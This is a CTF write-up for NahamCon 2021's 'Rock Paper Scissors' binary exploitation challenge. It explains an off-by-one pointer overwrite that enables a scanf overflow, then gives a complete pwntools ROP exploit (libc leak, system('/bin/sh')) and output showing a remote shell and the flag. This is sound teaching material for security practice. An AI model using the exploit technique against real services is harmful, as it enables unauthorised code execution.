# NahamCon CTF 2021

## Rock Paper Scissors [medium[

> Author: @M_alpha#3534
>
> How about a friendly game of rock-paper-scissors? 
>
> [rps](rps) [libc-2.31.so](libc-2.31.so)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _format-string_ _scanf_


## Summary

A `read` statement is allowed to overshoot its buffer by one, allowing an attacker to change the LSB of a pointer from static format string `%d` to static format string `%s`.  This then opens up a classic `scanf` `%s` buffer overflow.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and no canary, ripe for _rop_ and _bof_.  No GOT attacks however, _gotta_ use what we _got_.

### Decompile with Ghidra

```c
void FUN_00401313(void)
{
  int iVar1;
  time_t tVar2;
  int local_14;
  int local_10;
  char local_9;
  
  local_9 = '\x01';
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  while (local_9 != '\0') {
    iVar1 = rand();
    local_10 = iVar1 % 3 + 1;
    FUN_004012c9();
    __isoc99_scanf(PTR_DAT_00404028,&local_14,&local_14);
    getchar();
    if (local_10 == local_14) {
      puts("Congrats you win!!!!!");
    }
    else {
      puts("You lose!");
    }
    putchar(10);
    printf("Would you like to play again? [yes/no]: ");
    read(0,&DAT_00404010,0x19);
    iVar1 = strcmp("no\n",&DAT_00404010);
    if (iVar1 == 0) {
      local_9 = '\0';
    }
    else {
      iVar1 = strcmp("yes\n",&DAT_00404010);
      if (iVar1 == 0) {
        local_9 = '\x01';
      }
      else {
        puts("Well you didn\'t say yes or no..... So I\'m assuming no.");
        local_9 = '\0';
      }
    }
    memset(&DAT_00404010,0,4);
  }
  return;
}
```

`FUN_00401313` is the vulnerable function, specifically the line `read(0,&DAT_00404010,0x19)`, that reads up to `0x19` (25) bytes into global `DAT_00404010` (which is only 24 bytes length), that can then be used to overwrite the LSB of global `PTR_DAT_00404028`.  By default `PTR_DAT_00404028` is pointing to a static string `%d`, by changing the last byte to `0x08` we can now have it point to the static string `%s`.

> Load this up in Ghidra and look around, you'll see it.

With a 2nd pass and `%s` setup for `scanf` we can simply overflow the buffer.


## Exploit

Standard fare pwntools:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rps')
binary.symbols['rps'] = 0x401313

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 31004)
    libc = ELF('./libc-2.31.so')
else:
    p = process(binary.path)
    libc = binary.libc
```

```python
p.sendlineafter('[y/n]: ','y')
p.sendlineafter('> ','1')

# move pointer from %d to %s
payload = b'yes\n\0' + (0x19 - 5 - 1) * b'A' + p8(0x8)
p.sendlineafter('[yes/no]: ',payload)
```

> Given how the random numbers here are 100% predictable, it would be easy to determine how to win each round, but that isn't what we are here to win, just pick _rock_ each time and move on.

When prompted to play again, clearly `yes\n` is the answer, followed by `\0`, some padding, and a `0x8` as the 25th byte to change the pointer used for the format-string from `%d` to `%s`.

```python
pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x14 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.rps)

p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no')

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 0x14 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no')
p.interactive()
```

Round two is just like every other babyrop: leak libc, compute location of libc, loop back to vuln function, then call `system`.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/nahamconctf2021/rps/rps'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.nahamcon.com on port 31004: Done
[*] '/pwd/datajerk/nahamconctf2021/rps/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f2f14cbd000
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ cat flag.txt
flag{93548e97b8c15400117891070d84e5cc}
```

